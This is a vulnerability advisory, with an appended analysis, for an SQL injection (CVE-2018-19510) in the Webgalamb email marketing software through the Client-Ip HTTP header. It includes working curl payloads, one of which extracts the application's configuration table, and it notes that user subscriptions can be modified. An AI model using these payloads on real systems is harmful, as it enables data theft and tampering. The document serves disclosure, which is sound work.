```
Summary
-------

Vendor: E.N.S. Zrt (www.ens.hu)
Product: Webgalamb (www.webgalamb.hu, www.facebook.com/webgalamb)

Webgalamb is a commercial email marketing software.

The findings had been verified with latest Webgalamb versions (v6 and v7), older versions are probably also affected.
The vendor confirmed the vulnerabilities but the remediation plan was not shared.

CVE-2018-19510: SQL injection in insert via Client-IP HTTP header
-----------------------------------------------------------------

  curl -d "mail=test2 () test tt&save=1" --header "Client-Ip: 'foo" -v
"<http://www.victim.tld/webgalamb/subscriber.php?g=1&f=b187b56a83">;

In the SQL log:
  2018-10-25 18:06:38 - Url: <http://www.victim.tld/webgalamb/subscriber.php?g=1&f=b187b56a83>

  Bad SQL:[insert into `wg7_users` ( mail, omail, mail_id, ip, ip_orig, datum, verify_code,  active, g, a, ipdatum )
values

                                                 ( 'test2 () test tt', 'test2 () test tt', '3', ''foo', ''foo',
CURDATE(), 'k7k64a8kk71811fcb841k71k1f5ffda16ec96eff', '1', '1', '1', now() )]/You have an error in your SQL syntax;
check the manual that corresponds to your MySQL server version for the right syntax to use near 'foo', ''foo',
CURDATE(), 'k7k64a8kk71811fcb841k71k1f5ffda16ec96eff', '1', '1', '' at line 2 :
(c:\htdocs\webgalamb\subscriber.php:2241)

Example of a meaningful SQL injection:

  curl -d "mail=test4 () test tt&save=1" --header "Client-Ip: ', 5,CURDATE(), 7, 1,9,10, now()), ((SELECT
GROUP_CONCAT(conf_value) FROM wg7_config),2,3,4,5,CURDATE(),7,8,65535,1,NOW()) -- foo" -v
"<http://www.victim.tld/webgalamb/subscriber.php?g=1&f=b187b56a83">;

An UPDATE wg7_users SQL expression is also vulnerable to the same pattern; it is possible to modify any user
subscriptions.
```

- **Root cause of vulnerability**: The application does not properly sanitize the `Client-Ip` HTTP header before using it in an SQL query.
- **Weaknesses/vulnerabilities present**: SQL Injection vulnerability.
- **Impact of exploitation**: An attacker can inject arbitrary SQL code, which could lead to data exfiltration or modification of user data. Specifically, an attacker can modify user subscriptions.
- **Attack vectors**: Sending a crafted POST request to `/webgalamb/subscriber.php` with a malicious `Client-Ip` header.
- **Required attacker capabilities/position**: The attacker needs to be able to send HTTP requests to the vulnerable application.